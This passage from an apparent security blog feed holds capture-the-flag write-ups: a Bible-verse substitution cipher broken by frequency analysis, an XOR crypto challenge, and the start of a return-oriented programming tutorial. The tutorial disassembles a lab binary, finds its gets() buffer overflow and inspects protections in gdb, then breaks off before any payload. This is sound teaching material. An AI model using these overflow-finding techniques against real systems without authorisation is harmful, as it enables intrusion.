<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...snip...
</span><span class='line'>Ye shall not eat anything with the blood: neither shall ye use enchantments, nor practise augury.
</span><span class='line'>21
</span><span class='line'>And ye shall keep my statutes, and <span class="k">do</span> them: I am Jehovah who sanctifieth you.
</span><span class='line'>23
</span><span class='line'>And <span class="k">if</span> a man lie with a beast, he shall surely be put to death: and ye shall slay the beast.
</span><span class='line'>26
</span><span class='line'>And when he hath made an end of atoning <span class="k">for</span> the holy place, and the tent of meeting, and the altar, he shall present the live goat:
</span><span class='line'>47
</span></code></pre></td></tr></table></div></figure>


<p>A total of 30 distinct strings were found. I guessed these strings represented letters, so I extended the python script a bit and started puzzling:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">d</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;text-file&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
</span><span class='line'>          <span class="n">d</span><span class="p">[</span><span class="n">l</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="n">d</span><span class="p">[</span><span class="n">l</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">d</span><span class="o">.</span><span class="n">get</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">w</span><span class="p">,</span> <span class="n">d</span><span class="p">[</span><span class="n">w</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>  
</span><span class='line'><span class="n">x</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="nb">zip</span><span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">d</span><span class="o">.</span><span class="n">get</span><span class="p">,</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="s">&#39; etaoinsrhldcubkfgjmpqvwxyz012&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># transpose the strings to letters and print out the message</span>
</span><span class='line'><span class="n">out</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span><span class='line'>  <span class="n">out</span> <span class="o">+=</span> <span class="n">x</span><span class="p">[</span><span class="n">l</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'><span class="k">print</span> <span class="n">out</span>
</span></code></pre></td></tr></table></div></figure>


<p>I guessed that the most common string was a space, which indeed yielded word- and sentence-like output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">rtiisq</span> <span class="n">eroa</span> <span class="n">grniitlht</span> <span class="n">oa</span> <span class="n">wtdc</span> <span class="n">tnac</span> <span class="n">oalje</span> <span class="n">oe1</span> <span class="n">ojk</span> <span class="n">edcolh</span> <span class="n">es</span> <span class="n">bdoet</span> <span class="n">n</span> <span class="n">islh</span> <span class="n">ktaanht</span> <span class="k">as</span> <span class="n">aeneoaeoga</span> <span class="n">boii</span> <span class="n">rtip</span> <span class="n">csf</span> <span class="n">boer</span> <span class="n">ert</span> <span class="n">iteetd</span> <span class="n">mdtxftlgotav</span> <span class="n">ufe</span> <span class="n">ojk</span> <span class="n">lse</span> <span class="n">dtniic</span> <span class="n">hssy</span> <span class="n">ne</span> <span class="n">ernev</span> <span class="n">s0</span> <span class="n">erneja</span> <span class="n">tlsfhrq</span> <span class="n">nrnrq</span> <span class="n">ojk</span> <span class="n">ol</span> <span class="n">iswt</span> <span class="n">boer</span> <span class="n">aokpit</span> <span class="n">isbtdgnat</span> <span class="n">minha</span> <span class="n">boersfe</span> <span class="n">apngta</span> <span class="n">nly</span> <span class="n">aednlht</span> <span class="n">ackusiav</span> <span class="n">minhziureuhhfwmacleuuxbus2</span>
</span></code></pre></td></tr></table></div></figure>


<p>I then started to look for THE, THIS, A, AND to guess the first couple of letters:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Heoosq</span> <span class="n">THIS</span> <span class="n">gHnooelre</span> <span class="n">IS</span> <span class="n">wedc</span> <span class="n">enSc</span> <span class="n">ISljT</span> <span class="n">IT1</span> <span class="n">Ijk</span> <span class="n">TdcIlr</span> <span class="n">Ts</span> <span class="n">bdITe</span> <span class="n">n</span> <span class="n">oslr</span> <span class="n">keSSnre</span> <span class="n">Ss</span> <span class="n">STnTISTIgS</span> <span class="n">bIoo</span> <span class="n">Heop</span> <span class="n">csf</span> <span class="n">bITH</span> <span class="n">THe</span> <span class="n">oeTTed</span> <span class="n">mdexfelgIeSv</span> <span class="n">ufT</span> <span class="n">Ijk</span> <span class="n">lsT</span> <span class="n">denooc</span> <span class="n">rssy</span> <span class="n">nT</span> <span class="n">THnTv</span> <span class="n">s0</span> <span class="n">THnTjS</span> <span class="n">elsfrHq</span> <span class="n">nHnHq</span> <span class="n">Ijk</span> <span class="n">Il</span> <span class="n">oswe</span> <span class="n">bITH</span> <span class="n">SIkpoe</span> <span class="n">osbedgnSe</span> <span class="n">monrS</span> <span class="n">bITHsfT</span> <span class="n">SpngeS</span> <span class="n">nly</span> <span class="n">STdnlre</span> <span class="n">SckusoSv</span> <span class="n">monrzouHTurrfwmSclTuuxbus2</span>
</span></code></pre></td></tr></table></div></figure>


<p>Slowly but surely, I translated all the letters, and the words slowly emerged (I love that!):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">HEoonq</span> <span class="n">THIS</span> <span class="n">gHAooEldE</span> <span class="n">IS</span> <span class="n">VERY</span> <span class="n">EASY</span> <span class="n">ISljT</span> <span class="n">IT1</span> <span class="n">Ijk</span> <span class="n">TRYIld</span> <span class="n">Tn</span> <span class="n">WRITE</span> <span class="n">A</span> <span class="n">onld</span> <span class="n">kESSAdE</span> <span class="n">Sn</span> <span class="n">STATISTIgS</span> <span class="n">WIoo</span> <span class="n">HEop</span> <span class="n">Ynf</span> <span class="n">WITH</span> <span class="n">THE</span> <span class="n">oETTER</span> <span class="n">mRExfElgIESb</span> <span class="n">ufT</span> <span class="n">Ijk</span> <span class="n">lnT</span> <span class="n">REAooY</span> <span class="n">dnnc</span> <span class="n">AT</span> <span class="n">THATb</span> <span class="n">n0</span> <span class="n">THATjS</span> <span class="n">ElnfdHq</span> <span class="n">AHAHq</span> <span class="n">Ijk</span> <span class="n">Il</span> <span class="n">onVE</span> <span class="n">WITH</span> <span class="n">SIkpoE</span> <span class="n">onWERgASE</span> <span class="n">moAdS</span> <span class="n">WITHnfT</span> <span class="n">SpAgES</span> <span class="n">Alc</span> <span class="n">STRAldE</span> <span class="n">SYkunoSb</span> <span class="n">moAdzouHTuddfVmSYlTuuxWun2</span>
</span><span class='line'>
</span><span class='line'><span class="n">HELLoq</span> <span class="n">THIS</span> <span class="n">CHALLENGE</span> <span class="n">IS</span> <span class="n">VERY</span> <span class="n">EASY</span> <span class="n">ISN</span><span class="s">&#39;T IT? I&#39;</span><span class="n">k</span> <span class="n">TRYING</span> <span class="n">To</span> <span class="n">WRITE</span> <span class="n">A</span> <span class="n">LoNG</span> <span class="n">kESSAGE</span> <span class="n">So</span> <span class="n">STATISTICS</span> <span class="n">WILL</span> <span class="n">HELp</span> <span class="n">Yof</span> <span class="n">WITH</span> <span class="n">THE</span> <span class="n">LETTER</span> <span class="n">mRExfENCIESb</span> <span class="n">ufT</span> <span class="n">I</span><span class="s">&#39;k NoT REALLY Good AT THATb oj THAT&#39;</span><span class="n">S</span> <span class="n">ENofGHq</span> <span class="n">AHAHq</span> <span class="n">I</span><span class="s">&#39;k IN LoVE WITH SIkpLE LoWERCASE mLAGS WITHofT SpACES ANd STRANGE SYkuoLSb mLAGzLuHTuGGfVmSYNTuuxWuo2</span>
</span><span class='line'>
</span><span class='line'><span class="n">HELLOq</span> <span class="n">THIS</span> <span class="n">CHALLENGE</span> <span class="n">IS</span> <span class="n">VERY</span> <span class="n">EASY</span> <span class="n">ISN</span><span class="s">&#39;T IT? I&#39;</span><span class="n">M</span> <span class="n">TRYING</span> <span class="n">TO</span> <span class="n">WRITE</span> <span class="n">A</span> <span class="n">LONG</span> <span class="n">MESSAGE</span> <span class="n">SO</span> <span class="n">STATISTICS</span> <span class="n">WILL</span> <span class="n">HELP</span> <span class="n">YOU</span> <span class="n">WITH</span> <span class="n">THE</span> <span class="n">LETTER</span> <span class="n">kRExUENCIESb</span> <span class="n">uUT</span> <span class="n">I</span><span class="s">&#39;M NOT REALLY GOOd AT THATb Oj THAT&#39;</span><span class="n">S</span> <span class="n">ENOUGHq</span> <span class="n">AHAHq</span> <span class="n">I</span><span class="s">&#39;M IN LOVE WITH SIMPLE LOWERCASE kLAGS WITHOUT SPACES ANd STRANGE SYMuOLSb kLAGzLuHTuGGUVkSYNTuuxWuO2</span>
</span><span class='line'>
</span><span class='line'><span class="n">HELLO</span><span class="err">!</span> <span class="n">THIS</span> <span class="n">CHALLENGE</span> <span class="n">IS</span> <span class="n">VERY</span> <span class="n">EASY</span> <span class="n">ISN</span><span class="s">&#39;T IT? I&#39;</span><span class="n">M</span> <span class="n">TRYING</span> <span class="n">TO</span> <span class="n">WRITE</span> <span class="n">A</span> <span class="n">LONG</span> <span class="n">MESSAGE</span> <span class="n">SO</span> <span class="n">STATISTICS</span> <span class="n">WILL</span> <span class="n">HELP</span> <span class="n">YOU</span> <span class="n">WITH</span> <span class="n">THE</span> <span class="n">LETTER</span> <span class="n">FREQUENCIES</span><span class="p">,</span> <span class="n">BUT</span> <span class="n">I</span><span class="s">&#39;M NOT REALLY GOOD AT THAT, OK THAT&#39;</span><span class="n">S</span> <span class="n">ENOUGH</span><span class="err">!</span> <span class="n">AHAH</span><span class="err">!</span> <span class="n">I</span><span class="s">&#39;M IN LOVE WITH SIMPLE LOWERCASE FLAGS WITHOUT SPACES AND STRANGE SYMBOLS, FLAG{LBHTBGGUVFSYNTBBQWBO}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The final translation dictionary was: <code>x = dict(zip(sorted(d, key=d.get, reverse=True), " TESILAOHGNRYBWMUC'FP!,VQD{K?}"))</code>
The challenge already said that the flag needed a bit more work. Indeed, <code>flag{lbhtbgguvfsyntbbqwbo}</code> was not accepted. What then? Bitvijays suggested that the flag was another &ldquo;ciphertext&rdquo;, so I thought of Caesar cipher. The easiest is <a href="http://rot13.com">rot13</a> and indeed, the flag was <code>flag{yougotthisflagoodjob}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - Exorcise]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-exorcise/"/>
    <updated>2015-07-12T11:39:10+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-exorcise</id>
    <content type="html"><![CDATA[<p>Exorcise was a 50 point crypto challenge for PoliCTF.</p>

<!--more-->


<p>We&rsquo;re asked to connect to <code>exorcise.polictf.it:80</code>. Upon connecting, we&rsquo;re presented with a hexadecimal string. I pressed return and got another:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc exorcise.polictf.it 80
</span><span class='line'>2e0540472c37151c4e007f481c2a0110311204084f
</span><span class='line'>
</span><span class='line'>2e0541495b161248101c2a11122d16102d1608091902027f0d071c2c53050a061f05380d410f0a2a531f1e1907053d3310543e5d1c3a512653020c09461809025b341111475310451b3a014736000c4d0404002c1c4f142d164805001f107f094114103110074c190344283a00063b110c26413a00
</span></code></pre></td></tr></table></div></figure>


<p>Because of the challenge title, I xor&#8217;ed the second string using the first as a key and got gibberish. I decided to reconnect and send a bunch of NULL bytes (Ctrl+Space). When I xor&#8217;ed that string against the first, I got this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>What<span class="s1">&#39;s your name^i%UX`C=h=pN^xPdaW]j,1ISJC&#39;</span>t yru4OBwguHi! What<span class="err">&#39;</span>s your name^G
</span></code></pre></td></tr></table></div></figure>


<p>Hmmmmm. I reconnected again, sent a bunch of A characters and the resulting string was xor&#8217;ed vs 0x41:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">e</span> <span class="o">=</span> <span class="s">&quot;2e0541263a1e352928321e70321e32711e32282c312d241e382e341e32292e342d251e292037241e322e2d3724251e1e28351e702f1e741e3224223c272d20263a1e352928321e70321e32711e32282c312d241e382e341e32292e342d251e292037241e322e2d3724251e1e28351e702f1e741e3224223c272d2026557f3d0e490a3044533e01557f010c0c14050b38591b1d36004802101f173e0f04561c30064f1c040a063e3d050d7f50022d503b0a450412124c150f1e7f1f0d105d7f7e07371642281a1a0850180d3a0a0a553e010d4f1f19172b480056072a1d0c04560a027f280c1d2d554e3d4c2b1616&quot;</span>
</span><span class='line'><span class="n">msg</span> <span class="o">=</span> <span class="p">[</span><span class="n">e</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">start</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">start</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">2</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'><span class="n">out</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span>
</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x41</span><span class="o">^</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">out</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/exorcise<span class="nv">$ </span>python exorcise.py
</span><span class='line'>oDg<span class="o">{</span>_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec<span class="o">}</span>flag<span class="o">{</span>_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec<span class="o">}</span>flag
</span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s the flag: <code>flag{_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec}</code>. Took me a bit longer than 5 seconds&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ROP Primer - Level0]]></title>
    <link href="http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/"/>
    <updated>2015-06-28T19:45:38+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/06/28/rop-primer-level0</id>
    <content type="html"><![CDATA[<p>The ROP VM which I made for this exercise can be downloaded from <a href="https://www.vulnhub.com/entry/rop-primer-02,114/">vulnhub.com</a>. Version 0.2 is fixed, as the home dirs had improper permissions (thanks to faleur and marky for notifying me). We&rsquo;re up against the binary <code>level0</code>. In this case, we have the source code, which helps tremendously. Nevertheless, start by treating it as a blackbox.</p>

<!--more-->


<p>First, enable coredumps.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
</span></code></pre></td></tr></table></div></figure>


<p>Then, make sure you&rsquo;re not running the exploits against a SUID binary. Linux, by default, will <em>not</em> generate coredumps for SUID binaries. Fair enough. Thanks to @Swappage for alerting me during the workshop!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># remember, coredumps don&#39;t work on suid binaries</span>
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># so cp ./level0 (suid level1) to ./level0b</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, disassemble the binary with <code>objdump</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>objdump -d -M intel ./level0 &gt; level0.out
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># -M intel will use the Intel syntax instead of AT&amp;T&#39;s syntax.</span>
</span></code></pre></td></tr></table></div></figure>


<p>In some cases, the binary is the only thing given, with no source code available. The disassembly will help to get an understanding of what the binary is doing.</p>

<p>Another useful command is <code>file</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>file ./level0
</span><span class='line'>./level0: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 2.6.26, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0x52c391fb68f9d0b47e49220dfe408334f8fdd088, not stripped
</span></code></pre></td></tr></table></div></figure>


<p>This tells us that the binary is 32 bit and statically linked, which explains its large size.</p>

<p>Let&rsquo;s have a look at the disassembly of <code>main()</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="m">08048254</span> &lt;main&gt;:
</span><span class='line'> 8048254:       <span class="m">55</span>                      push   ebp
</span><span class='line'> 8048255:       <span class="m">89</span> e5                   mov    ebp,esp
</span><span class='line'> 8048257:       <span class="m">83</span> e4 f0                and    esp,0xfffffff0
</span><span class='line'> 804825a:       <span class="m">83</span> ec <span class="m">30</span>                sub    esp,0x30
</span><span class='line'> 804825d:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">68</span> b6 0a <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab668
</span><span class='line'> 8048264:       e8 d7 0c <span class="m">00</span> <span class="m">00</span>          call   8048f40 &lt;_IO_puts&gt;
</span><span class='line'> 8048269:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">80</span> b6 0a <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab680
</span><span class='line'> 8048270:       e8 0b 0b <span class="m">00</span> <span class="m">00</span>          call   8048d80 &lt;_IO_printf&gt;
</span><span class='line'> 8048275:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">10</span>             lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
</span><span class='line'> 8048279:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804827c:       e8 2f 0b <span class="m">00</span> <span class="m">00</span>          call   8048db0 &lt;_IO_gets&gt;
</span><span class='line'> 8048281:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">10</span>             lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
</span><span class='line'> 8048285:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'> 8048289:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">98</span> b6 0a <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab698
</span><span class='line'> 8048290:       e8 eb 0a <span class="m">00</span> <span class="m">00</span>          call   8048d80 &lt;_IO_printf&gt;
</span><span class='line'> 8048295:       b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x0
</span><span class='line'> 804829a:       c9                      leave
</span><span class='line'> 804829b:       c3                      ret
</span></code></pre></td></tr></table></div></figure>


<p>We have a classic buffer overflow situation here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 8048275:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">10</span>             lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
</span><span class='line'> 8048279:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 804827c:       e8 2f 0b <span class="m">00</span> <span class="m">00</span>          call   8048db0 &lt;_IO_gets&gt;
</span></code></pre></td></tr></table></div></figure>


<p>The <code>lea</code> command will load a stack address into <code>eax</code>. That address is put on the stack as an argument for <code>_IO_gets</code>, which will happily read more than enough bytes from STDIN to overflow the buffer and overwrite the saved return address on the stack.</p>

<p>Let&rsquo;s switch to <code>gdb-peda</code> and see the binary in action.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># gdb -q is quiet startup, so it won&#39;t print out lots of info. Not strictly necessary. </span>
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb ./level0 -q
</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p><code>checksec</code> is a very useful command available in <code>gdb-peda</code> (not in vanilla <code>gdb</code>). In this case, one can see that only NX is enabled, meaning that the stack, heap and other data sections are not executable, whereas code sections are executable but not writeable. Let&rsquo;s check this within <code>gdb</code>. First, enter <code>start</code> to run the binary and break at the <code>main()</code> function automatically. Then, inspect the memory layout with <code>vmmap</code>, which will show memory regions that are active in memory along with their memory protection flags.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>start
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0xbffff6bc --&gt; 0xbffff7ff <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
</span><span class='line'>EBX: 0x0
</span><span class='line'>ECX: 0x1
</span><span class='line'>EDX: 0xbffff6b4 --&gt; 0xbffff7ea <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
</span><span class='line'>ESI: 0x80488e0 <span class="o">(</span>&lt;__libc_csu_fini&gt;:   push   ebp<span class="o">)</span>
</span><span class='line'>EDI: 0x193a5dce
</span><span class='line'>EBP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0
</span><span class='line'>ESP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0
</span><span class='line'>EIP: 0x8048257 <span class="o">(</span>&lt;main+3&gt;:    and    esp,0xfffffff0<span class="o">)</span>
</span><span class='line'>EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x804824f &lt;frame_dummy+63&gt;:  jmp    0x80481a0 &lt;register_tm_clones&gt;
</span><span class='line'>   0x8048254 &lt;main&gt;:    push   ebp
</span><span class='line'>   0x8048255 &lt;main+1&gt;:  mov    ebp,esp
</span><span class='line'><span class="o">=</span>&gt; 0x8048257 &lt;main+3&gt;:    and    esp,0xfffffff0
</span><span class='line'>   0x804825a &lt;main+6&gt;:  sub    esp,0x30
</span><span class='line'>   0x804825d &lt;main+9&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab668
</span><span class='line'>   0x8048264 &lt;main+16&gt;: call   0x8048f40 &lt;puts&gt;
